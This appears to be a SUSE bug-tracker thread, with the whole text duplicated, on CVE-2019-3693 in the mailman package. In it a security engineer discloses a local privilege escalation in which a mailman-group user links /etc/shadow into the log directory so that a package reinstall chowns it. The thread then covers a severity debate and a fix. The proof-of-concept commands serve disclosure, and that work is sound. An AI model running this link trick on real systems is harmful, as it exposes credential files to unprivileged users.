| [Description](show_bug.cgi?id=1154328#c0)  Johannes Segitz   2019-10-17 11:13:21 UTC  ``` 272 if [ -e %{varmmdir}/logs/error ]; then 273     chown wwwrun.mailman %{varmmdir}/logs/error  on systems with fs.protected_hardlinks=0 this allows users in group mailman to gain access to arbitrary files that have group permissions.  POC: sh-5.0$ id uid=72(mailman) gid=67(mailman) groups=67(mailman) sh-5.0$ pwd /var/lib/mailman/logs sh-5.0$ rm error sh-5.0$ ln /etc/shadow error  as root: zypper in  -f mailman ls -lah /etc/shadow -rw-r----- 2 wwwrun mailman 1.6K Oct 17 13:05 /etc/shadow  For user wwwrun this alloes LPE from root with the same vector ``` [Comment 2](show_bug.cgi?id=1154328#c2)  Matej Cepl   2019-10-17 15:56:03 UTC  ``` I don’t get this. If this is a security bug, how it is different from any other g+w directory in the system? You could do the same with any other such directory.  If a sysadmin wants to be that much paranoid, then they should certainly set fs.protected_hardlinks=1 and be done with it. ``` [Comment 3](show_bug.cgi?id=1154328#c3)  Johannes Segitz   2019-10-21 07:00:37 UTC  ``` (In reply to Matej Cepl from [comment #2](show_bug.cgi?id=1154328#c2)) > I don’t get this. If this is a security bug, how it is different from any other g+w directory in the system? You could do the same with any other such directory.  You don't have chown running on the other directories. But yes, it would also be an issue if a privileged process would operate in these directories and trust the content.  > If a sysadmin wants to be that much paranoid, then they should certainly set fs.protected_hardlinks=1 and be done with it.  fs.protected_hardlinks is definitely a recommended setting, but the security of our packages shouldn't depend on it ``` [Comment 4](show_bug.cgi?id=1154328#c4)  Johannes Segitz   2019-10-25 11:56:23 UTC  ``` Also works with symlinks on default systems:  sh-5.0$ id uid=72(mailman) gid=67(mailman) groups=67(mailman) sh-5.0$ pwd /var/lib/mailman/logs sh-5.0$ rm error sh-5.0$ ln -s /test/shadow error sh-5.0$ ls -l total 0 lrwxrwxrwx 1 mailman mailman 12 Oct 25 13:54 error -> /test/shadow  Reinstall mailman  sh-5.0$ ls -lah /test/shadow -r-------- 1 wwwrun mailman 1.2K Oct 25 13:20 /test/shadow  Please use CVE-2019-3693 to track this. You can make this bug public at any point ``` [Comment 5](show_bug.cgi?id=1154328#c5)  Matej Cepl   2019-10-26 19:54:34 UTC  ``` (In reply to Johannes Segitz from [comment #3](show_bug.cgi?id=1154328#c3)) > You don't have chown running on the other directories. But yes, it would > also be an issue if a privileged process would operate in these directories > and trust the content.  Except the process which is dangerous is not mailman, but zypper in this case. And if somebody has root access enough to run zypper in -f than I think we lost anyway. This really seems like a nit to me. ``` [Comment 6](show_bug.cgi?id=1154328#c6)  Johannes Segitz   2019-11-04 12:22:46 UTC  ``` (In reply to Matej Cepl from [comment #5](show_bug.cgi?id=1154328#c5)) The dangerous part is in the packaging of mailman, it's not a zypper issue. rpm just executes what is packaged.  And the zypper -f is just an POC. The real attack would need to wait for the next mailman update to trigger the problem. ``` [Comment 7](show_bug.cgi?id=1154328#c7)  Matej Cepl   2019-11-15 17:32:54 UTC  ``` OK, so what do you think about <https://build.suse.de/request/show/205299> and <https://build.suse.de/request/show/205298> ? ``` [Comment 8](show_bug.cgi?id=1154328#c8)  Johannes Segitz   2019-11-18 10:42:47 UTC  ``` (In reply to Matej Cepl from [comment #7](show_bug.cgi?id=1154328#c7)) that looks good, thank you ``` [Comment 10](show_bug.cgi?id=1154328#c10)  Swamp Workflow Management   2019-11-25 20:13:24 UTC  ``` SUSE-SU-2019:14230-1: An update that fixes one vulnerability is now available.

| [Description](show_bug.cgi?id=1154328#c0)  Johannes Segitz   2019-10-17 11:13:21 UTC  ``` 272 if [ -e %{varmmdir}/logs/error ]; then 273     chown wwwrun.mailman %{varmmdir}/logs/error  on systems with fs.protected_hardlinks=0 this allows users in group mailman to gain access to arbitrary files that have group permissions.  POC: sh-5.0$ id uid=72(mailman) gid=67(mailman) groups=67(mailman) sh-5.0$ pwd /var/lib/mailman/logs sh-5.0$ rm error sh-5.0$ ln /etc/shadow error  as root: zypper in  -f mailman ls -lah /etc/shadow -rw-r----- 2 wwwrun mailman 1.6K Oct 17 13:05 /etc/shadow  For user wwwrun this alloes LPE from root with the same vector ``` [Comment 2](show_bug.cgi?id=1154328#c2)  Matej Cepl   2019-10-17 15:56:03 UTC  ``` I don’t get this. If this is a security bug, how it is different from any other g+w directory in the system? You could do the same with any other such directory.  If a sysadmin wants to be that much paranoid, then they should certainly set fs.protected_hardlinks=1 and be done with it. ``` [Comment 3](show_bug.cgi?id=1154328#c3)  Johannes Segitz   2019-10-21 07:00:37 UTC  ``` (In reply to Matej Cepl from [comment #2](show_bug.cgi?id=1154328#c2)) > I don’t get this. If this is a security bug, how it is different from any other g+w directory in the system? You could do the same with any other such directory.  You don't have chown running on the other directories. But yes, it would also be an issue if a privileged process would operate in these directories and trust the content.  > If a sysadmin wants to be that much paranoid, then they should certainly set fs.protected_hardlinks=1 and be done with it.  fs.protected_hardlinks is definitely a recommended setting, but the security of our packages shouldn't depend on it ``` [Comment 4](show_bug.cgi?id=1154328#c4)  Johannes Segitz   2019-10-25 11:56:23 UTC  ``` Also works with symlinks on default systems:  sh-5.0$ id uid=72(mailman) gid=67(mailman) groups=67(mailman) sh-5.0$ pwd /var/lib/mailman/logs sh-5.0$ rm error sh-5.0$ ln -s /test/shadow error sh-5.0$ ls -l total 0 lrwxrwxrwx 1 mailman mailman 12 Oct 25 13:54 error -> /test/shadow  Reinstall mailman  sh-5.0$ ls -lah /test/shadow -r-------- 1 wwwrun mailman 1.2K Oct 25 13:20 /test/shadow  Please use CVE-2019-3693 to track this. You can make this bug public at any point ``` [Comment 5](show_bug.cgi?id=1154328#c5)  Matej Cepl   2019-10-26 19:54:34 UTC  ``` (In reply to Johannes Segitz from [comment #3](show_bug.cgi?id=1154328#c3)) > You don't have chown running on the other directories. But yes, it would > also be an issue if a privileged process would operate in these directories > and trust the content.  Except the process which is dangerous is not mailman, but zypper in this case. And if somebody has root access enough to run zypper in -f than I think we lost anyway. This really seems like a nit to me. ``` [Comment 6](show_bug.cgi?id=1154328#c6)  Johannes Segitz   2019-11-04 12:22:46 UTC  ``` (In reply to Matej Cepl from [comment #5](show_bug.cgi?id=1154328#c5)) The dangerous part is in the packaging of mailman, it's not a zypper issue. rpm just executes what is packaged.  And the zypper -f is just an POC. The real attack would need to wait for the next mailman update to trigger the problem. ``` [Comment 7](show_bug.cgi?id=1154328#c7)  Matej Cepl   2019-11-15 17:32:54 UTC  ``` OK, so what do you think about <https://build.suse.de/request/show/205299> and <https://build.suse.de/request/show/205298> ? ``` [Comment 8](show_bug.cgi?id=1154328#c8)  Johannes Segitz   2019-11-18 10:42:47 UTC  ``` (In reply to Matej Cepl from [comment #7](show_bug.cgi?id=1154328#c7)) that looks good, thank you ``` [Comment 10](show_bug.cgi?id=1154328#c10)  Swamp Workflow Management   2019-11-25 20:13:24 UTC  ``` SUSE-SU-2019:14230-1: An update that fixes one vulnerability is now available.
